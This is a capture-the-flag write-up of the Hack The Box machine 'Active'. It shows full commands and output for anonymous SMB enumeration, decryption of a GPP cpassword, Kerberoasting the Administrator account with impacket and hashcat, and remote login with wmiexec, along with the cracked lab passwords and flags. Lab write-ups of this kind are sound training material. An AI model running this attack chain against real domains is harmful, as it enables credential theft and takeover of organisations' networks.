---
title: "[HTB] Active Writeup"
date: 2026-04-20 16:00:00 +0900
author: aestera
categories: [HTB, Writeup]
tags: [Windows, AD]
description: HTB Active write-up
math: true
image: https://pub-c64d7608f6724ae48e3b199d196d7dcd.r2.dev/Blog/Active_Thumbnail.png
---

# TL;DR
Anonymous SMB access to the Replication share exposed GPP credentials in Groups.xml for the SVC_TGS account. These credentials allowed Kerberoasting of the Administrator account, whose service ticket was cracked offline to recover the password and obtain administrative access to the Domain Controller.

---

# 0. Recon

**Nmap** scan shows that the target was Windows Active Directory Domain Controller. LDAP banner identified the domain as `active.htb`

**Port Scan Results**
![2026-04-20-14-42-02](https://pub-c64d7608f6724ae48e3b199d196d7dcd.r2.dev/obsidian/2026/04/20/2026-04-20-14-42-02-1776663727470.png)

| IP Address     | Ports Open                                                                                                                            |
| -------------- | ------------------------------------------------------------------------------------------------------------------------------------- |
| 10.129.241.190 | **TCP:** 53, 135, 139, 389, 445, 464, 593, 636, 3268, 3269, 5722, 9389, 47001, 49152, 49153, 49154, 49155, 49157, 49158, 49169, 49177 |


---

# 1. Initial Access - SMB enumeration

SMB enumeration revealed that the `Replication` share was accessible with **read-only** permissions without valid user credentials.

```bash
└─$ smbmap -H 10.129.241.190
```
![2026-04-20-15-18-13](https://pub-c64d7608f6724ae48e3b199d196d7dcd.r2.dev/obsidian/2026/04/20/2026-04-20-15-18-13-1776665896336.png)

Further enumeration of the **Replication** share revealed the file `\active.htb\Policies\{31B2F340-016D-11D2-945F-00C04FB984F9}\MACHINE\Preferences\Groups\Groups.xml`.

```bash
└─$ smbclient //10.129.241.190/Replication
```
![2026-04-20-15-32-25](https://pub-c64d7608f6724ae48e3b199d196d7dcd.r2.dev/obsidian/2026/04/20/2026-04-20-15-32-25-1776666750441.png)

The `Groups.xml` file contained the **cpassword** value for the **SVC_TGS** account.
```xml
<?xml version="1.0" encoding="utf-8"?>
<Groups clsid="{3125E937-EB16-4b4c-9934-544FC6D24D26}">
	<User clsid="{DF5F1855-51E5-4d24-8B1A-D9BDE98BA1D1}" name="active.htb\SVC_TGS" image="2" changed="2018-07-18 20:46:06" uid="{EF57DA28-5F69-4530-A59E-AAB58578219D}">
		<Properties action="U" newName="" fullName="" description="" cpassword="edBSHOwhZLTjt/QS9FeIcJ83mjWA98gw9guKOhJOdcqh+ZGMeXOsQbCpZ3xUjTLfCuNH8pG5aSVYdYw/NglVmQ" changeLogon="0" noChange="1" neverExpires="1" acctDisabled="0" userName="active.htb\SVC_TGS"/>
	</User>
</Groups>
```

The **cpassword** value can be decrypted using a publicly known key. After decrypting it, the password for **SVC_TGS** was recovered. These credentials allowed SMB access as **SVC_TGS**, which was then used to retrieve `user.txt`.

```bash
└─$ gpp-decrypt edBSHOwhZLTjt/QS9FeIcJ83mjWA98gw9guKOhJOdcqh+ZGMeXOsQbCpZ3xUjTLfCuNH8pG5aSVYdYw/NglVmQ
GPPstillStandingStrong2k18
```

```bash
└─$ smbclient //10.129.241.190/Users -U 'active.htb/SVC_TGS%GPPstillStandingStrong2k18'
Try "help" to get a list of possible commands.
smb: \> get \SVC_TGS\Desktop\user.txt
getting file \SVC_TGS\Desktop\user.txt of size 34 as \SVC_TGS\Desktop\user.txt (0.1 KiloBytes/sec) (average 0.1 KiloBytes/sec)

└─$ cat '\SVC_TGS\Desktop\user.txt' 
455e5e90141bdd7e21b6ac92439ad288
```

---

# 2. Privilege Escalation - Kerberoasting

Using the **SVC_TGS** account, a **Kerberoasting** attack was performed to request a TGS ticket for the **Administrator** account.

```bash
└─$ impacket-GetUserSPNs active.htb/SVC_TGS -dc-ip 10.129.241.190 -request  
```
![2026-04-20-15-20-55](https://pub-c64d7608f6724ae48e3b199d196d7dcd.r2.dev/obsidian/2026/04/20/2026-04-20-15-20-55-1776666061014.png)


The extracted ticket was cracked, successfully recovering the password for the **Administrator** account.

```bash
└─$ hashcat -m 13100 -a 0 -O hash.txt /usr/share/wordlists/rockyou.txt --show                                  
$krb5tgs$23$*Administrator$ACTIVE.HTB$active.htb/Administrator*$5686335df0b1f1db5b2baae0f7ebbee6$1f58b065d0a13cda346fdd435670647ceccc59801f20e2a8c400d5a26aad126827289cf138cd7a17bbbc4c44129ad5e80555261a6f389a9cc2737aef37115f47f62c01b04c5cd80f87eace8b9d8b1d0efd48a789622fa1068d4a01750b9b5946361262471f7f0988673eba740096d518af2d9dcaca81484f6661c05685d740f69a3b15c0c1eb2caff6fd081979442b182ac6a1b3a6aaafaa92d7c1af6e3c8c4a53c8891624a3e70d4558fe5651aa52f84333cd3182696076df91622510da66c3091bb1b2d7863eeebc4ce6f945e6de5ffc376f0961fc8eecfc31ba4ba5ed0dc71f24bde6affae7f30c4f658aa7016d0a4682c1faa15cb0227ced291c30eaa8970c3b6ea65cac8aac9803cdcb80b2c1d2a9b3fdf3ea42b69abbae3f1f3660dc1ff34b470777240609f07376035fce15c0d857276494ca0b9da15fafd7aca4bdae3eb9f52bd91b6afd92d116a4097e2aa445e2c86789f32fd864f1388028d13b5ff6898b3f29346d64935009396d836037b204ca009be0969641f891559f658b1b1ae5c7f62a8632f3601e231d53ebec3229cc573ebd0fda4a0e5f2dc2224f2b72fbd81b6dbbc4c7035447674fe4f6e982b41d36ae6ba8296d791b243e48886b8241d4afa8ab4b9c9caec905561aa141d7ae4f84d553622fce78af23e18689cbf3d807199716bfee1da0798baae9a62c86be46c718a82f4b06711475ab7307b8778471f71825faa77d561e6306484f8093423d8cb7ddcdd8fd06612267d78b09eb83ab006eff967e90c56b9e0d8b17b0d13ffb027b8a82399b8cb40310cf592b87f3ec6b8404f3bc4bd789dd5c36313e03a6ae60a83d3e64990bf100d25ba1a4d022ab3d8273e5f2f92d454db3adf9c8f4a9d3a85e6f67d3ea8b81f67d6a19d8544a243cb16b3b8903670eff0320decc827f321dcdaa9585bbe453be7998aa163cb74f736b8cb481e62e381de1534a0e93ec553f9ea44023e92dc57e271832dd8deefb87f62c0b656f2eca38dcbdc61a35b03a0ca76ab817d29222b072198668f7b848b0d54c55c080bff8f9b29ff8a61453a94c91888f4b7f8d2ffdb02a90350a20f8bdb34985ae0d58e7777cff1789c0cb42b3a90e5f6d30ad2fdabba82719f4007e454b82ba184f28a453a152d1cc029357db97c4f479b53d91eccaf84c11ca8e7fc759f817d7cc1fd28b53ae58bf8b31a2617e86538b198d176f81bb31eb7e2168ffc992c289046ce9a3ac49afda7f65f321b0dced1d30836a:Ticketmaster1968


└─$ nxc smb 10.129.241.190 -u Administrator -p 'Ticketmaster1968' -d active.htb
SMB         10.129.241.190  445    DC               [*] Windows 7 / Server 2008 R2 Build 7601 x64 (name:DC) (domain:active.htb) (signing:True) (SMBv1:None) (Null Auth:True)
SMB         10.129.241.190  445    DC               [+] active.htb\Administrator:Ticketmaster1968 (Pwn3d!)
```


The cracked password was used to authenticate as **Administrator**, and `root.txt` was retrieved via wmiexec.

```bash
└─$ impacket-wmiexec -codec cp949 'active.htb/Administrator:Ticketmaster1968@10.129.241.190'
```

![2026-04-20-15-34-49](https://pub-c64d7608f6724ae48e3b199d196d7dcd.r2.dev/obsidian/2026/04/20/2026-04-20-15-34-49-1776666892182.png)